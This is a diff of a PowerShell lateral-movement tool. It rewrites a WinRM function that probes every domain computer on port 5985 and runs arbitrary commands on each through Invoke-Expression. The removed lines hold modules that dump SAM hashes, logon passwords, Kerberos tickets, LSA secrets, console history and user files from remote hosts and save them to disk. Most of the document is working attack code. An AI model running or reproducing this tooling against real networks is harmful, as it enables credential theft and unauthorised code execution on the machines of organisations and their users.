@@ -1858,209 +1858,223 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
 ############################################### Function: WinRM ################################################
 ################################################################################################################
 Function Method-WinRM {
-$ErrorActionPreference = "SilentlyContinue"
-Write-Host
-Write-Host
-    
-    $MaxConcurrentJobs = $Threads
-    $WinRMJobs = @()
+# Create a runspace pool
+$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
+$runspacePool.Open()
+$runspaces = New-Object System.Collections.ArrayList
 
-    foreach ($Computer in $Computers) {
-    $OS = $computer.Properties["operatingSystem"][0]
-    $ComputerName = $computer.Properties["dnshostname"][0]
-        $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles)
-            # Get the current PowerShell process
-$psProcess = Get-Process -Id $PID
-
-# Set the priority to High
-$psProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
-            $tcpClient = New-Object System.Net.Sockets.TcpClient
-            $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
-            $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
-
-            
-                if (!$wait){return}
-	            elseif ($wait){
-		            try{$tcpClient.EndConnect($asyncResult)
-		            $tcpClient.Close()}Catch{}
-                $Session = New-PSSession -ComputerName $ComputerName -ErrorAction "Ignore"
-
-                try {
-                    Invoke-Command -Session $Session {IEX $Using:CheckAdmin} -OutVariable "AdminConfirm" -ErrorAction "Ignore" | Out-Null
-                    Write-Host "WinRM " -ForegroundColor "Yellow" -NoNewline
-                    Write-Host "   " -NoNewline
-                    
-                    try {$Ping = New-Object System.Net.NetworkInformation.Ping
-                    $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-                    Write-Host ("{0,-16}" -f $IP) -NoNewline}
-                    catch { Write-Host ("{0,-16}" -f "") -NoNewline}
-                    
-                    Write-Host "   " -NoNewline
-                    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-                    Write-Host "   " -NoNewline
-                    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-                    Write-Host "   " -NoNewline
-                    Write-Host "[+] " -ForegroundColor Green -NoNewline
-                    Write-Host "SUCCESS " 
-
-
-
-                    if ($Module -eq "SAM") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction "Ignore"
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
-                    }
-                    
-                    elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")) {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"
-                    }
-                    
-                    elseif ($Module -eq "Tickets") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$MimiTickets\$ComputerName-Tickets.txt" -Encoding "ASCII"
-                    }
-
-                    elseif ($Module -eq "KerbDump") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$KerbDump\$ComputerName-Tickets-KerbDump.txt" -Encoding "ASCII"
-                    }
-                    
-                    elseif ($Module -eq "ekeys" -and $Option -ne "Parse") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
-                    }
-                    
-                    elseif ($Module -eq "ekeys" -and $Option -eq "Parse") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
-                    }
-                    
-                    elseif ($Module -eq "LSA") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
-                    }
-
-                    elseif ($Module -eq "ConsoleHistory") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput){$b | Write-host ; Write-Host}
-                        $b | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
-                    }
-
-                   elseif ($Module -eq "Files") {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        if ($ShowOutput) {
-                        $b | Write-Host
-                    }
-                        if ($b -like "*-*") {
-                        $b | Out-File -FilePath "$UserFiles\$ComputerName-UserFiles.txt" -Encoding "ASCII"
-                    }
-                }
-                   
-                    elseif ($Module -eq "Interactive") {
-                        Start-Process powershell.exe -ArgumentList '-noexit -Command', "Enter-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"
-                    }
-                    else {
-                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction "Ignore"
-                        $b | Write-host
-                    }
-
-                    if ($Command -ne "" -and $Module -eq "") {
-                        Write-Host
-                    }
-                }
-                catch {
-
-                if ($SuccessOnly){return}
-                    elseif (!$SuccessOnly){
-                    $Time = (Get-Date).ToString("HH:mm:ss")
-                    Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
-                    Write-Host "   " -NoNewline
-                    
-                    try {$Ping = New-Object System.Net.NetworkInformation.Ping
-                    $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-                    Write-Host ("{0,-16}" -f $IP) -NoNewline}
-                    catch { Write-Host ("{0,-16}" -f "") -NoNewline}
-                    
-                    Write-Host "   " -NoNewline
-                    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-                    Write-Host "   " -NoNewline
-                    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-                    Write-Host "   " -NoNewline
-                    Write-Host "[-] " -ForegroundColor Red -NoNewline
-                    Write-Host "ACCESS DENIED "
-                    
-                    }
-                }
-
-                try {
-                    Remove-PSSession $Session -ErrorAction SilentlyContinue
-                }
-                catch {}
-            }
-            else {
-                return
-            }
-        }
-
-        # Check if the number of currently running jobs is below the maximum limit
-        while (($WinRMJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
-            Start-Sleep -Milliseconds 500
-        }
-
-        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles
-        [array]$WinRMJobs += $WinRMJob
-
-        # Check if the maximum number of concurrent jobs has been reached
-        if ($WinRMJobs.Count -ge $MaxConcurrentJobs) {
-            do {
-                # Wait for any job to complete
-                $JobFinished = $null
-                foreach ($Job in $WinRMJobs) {
-                    if ($Job.State -eq 'Completed') {
-                        $JobFinished = $Job
-                        break
-                    }
-                }
-
-                if ($JobFinished) {
-                    # Retrieve the job result and remove it from the job list
-                    $Result = Receive-Job -Job $JobFinished
-                    # Process the result as needed
-                    $Result
-
-                    $WinRMJobs = $WinRMJobs | Where-Object { $_ -ne $JobFinished }
-                    Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
-                }
-            }
-            until (-not $JobFinished)
+$scriptBlock = {
+    param ($computerName, $Command)
+    try {
+        return Invoke-Command -ComputerName $computerName -ScriptBlock {Invoke-Expression $Using:Command} -ErrorAction Stop
+    } catch {
+        if ($_.Exception.Message -like "*Access is Denied*") {
+            return "Access Denied"
+        } else {
+            return "Unspecified Error"
         }
     }
-
-    # Wait for any remaining jobs to complete
-    $WinRMJobs | ForEach-Object {
-        $JobFinished = $_ | Wait-Job -Timeout 10
-
-        if ($JobFinished) {
-            # Retrieve the job result and remove it from the job list
-            $Result = Receive-Job -Job $JobFinished
-            # Process the result as needed
-            $Result
-
-            Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
-        }
-    }
-
-    # Clean up all remaining jobs
-    $WinRMJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
+
+
+function Test-RemoteAccess {
+    param ($ComputerName)
+    try {
+        $session = New-PSSession -ComputerName $ComputerName -ErrorAction Stop
+        # If the session is created, remove it and return true
+        Remove-PSSession $session
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+function Display-Output {
+    param (
+        [string]$computerName,
+        [string]$OS,
+        [string]$statusColor,
+        [string]$statusText
+    )
+
+    $IP = $null
+
+    try {
+        $Ping = New-Object System.Net.NetworkInformation.Ping
+        $IP = $($Ping.Send($computerName).Address).IPAddressToString
+    } catch {
+        $IP = ""
+    }
+
+    Write-Host "WMI" -ForegroundColor Yellow -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host ("{0,-16}" -f $IP) -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host $computerName -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host $OS -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host $statusText -ForegroundColor $statusColor
+}
+
+
+
+# Create and invoke runspaces for each computer
+foreach ($computer in $computers) {
+    $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
+
+    # Check if we can connect to port 5985
+    $tcpClient = New-Object System.Net.Sockets.TcpClient
+    $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
+    $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
+    $tcpClient.Close()
+
+    if (!$wait) {
+        continue
+    }
+
+    if ($Command -eq ""){
+
+    try {
+        $session = New-PSSession -ComputerName $ComputerName -ErrorAction Stop
+        # If the session is created, remove it and return true
+        Remove-PSSession $session
+            
+            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "   " -NoNewline
+
+            $IP = $null  # Reset IP for each iteration
+
+            try {
+                $Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline
+            } catch {
+                Write-Host ("{0,-16}" -f "") -NoNewline
+            }
+            
+            Write-Host "   " -NoNewline
+            Write-Host $ComputerName -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host $OS -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "SUCCESS "
+            continue
+    
+    } catch {
+            
+            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "   " -NoNewline
+
+            $IP = $null  # Reset IP for each iteration
+
+            try {
+                $Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline
+            } catch {
+                Write-Host ("{0,-16}" -f "") -NoNewline
+            }
+            
+            Write-Host "   " -NoNewline
+            Write-Host $ComputerName -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host $OS -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Access Denied "
+            continue
+    }
+
+
+
+    }
+
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
+    $runspace.RunspacePool = $runspacePool
+
+    [void]$runspaces.Add([PSCustomObject]@{
+        Runspace = $runspace
+        Handle = $runspace.BeginInvoke()
+        ComputerName = $ComputerName
+        OS = $OS
+        Completed = $false
+    })
+}
+
+# Poll the runspaces and display results as they complete
+do {
+    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+        if ($runspace.Handle.IsCompleted) {
+            $runspace.Completed = $true
+            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
+            
+            if ($result -eq "Access Denied"){
+
+            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "   " -NoNewline
+
+            $IP = $null  # Reset IP for each iteration
+
+            try {
+                $Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$($runspace.ComputerName)").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline
+            } catch {
+                Write-Host ("{0,-16}" -f "") -NoNewline
+            }
+            
+            Write-Host "   " -NoNewline
+            Write-Host $($runspace.ComputerName) -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host $($runspace.OS) -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Access Denied "
+            continue
+
+
+
+
+}
+            if ($result) {
+            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "   " -NoNewline
+
+            $IP = $null  # Reset IP for each iteration
+
+            try {
+                $Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$($runspace.ComputerName)").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline
+            } catch {
+                Write-Host ("{0,-16}" -f "") -NoNewline
+            }
+            
+            Write-Host "   " -NoNewline
+            Write-Host $($runspace.ComputerName) -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host $($runspace.OS) -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "SUCCESS "
+            $result | Write-Host 
+            Write-Host
+            
+            }
+        }
+    }
+    Start-Sleep -Milliseconds 100
+} while ($runspaces | Where-Object {-not $_.Completed})
+
+# Clean up
+$runspacePool.Close()
+$runspacePool.Dispose()
+
+}
+
 
 ################################################################################################################
 ################################################# Function: RDP ################################################
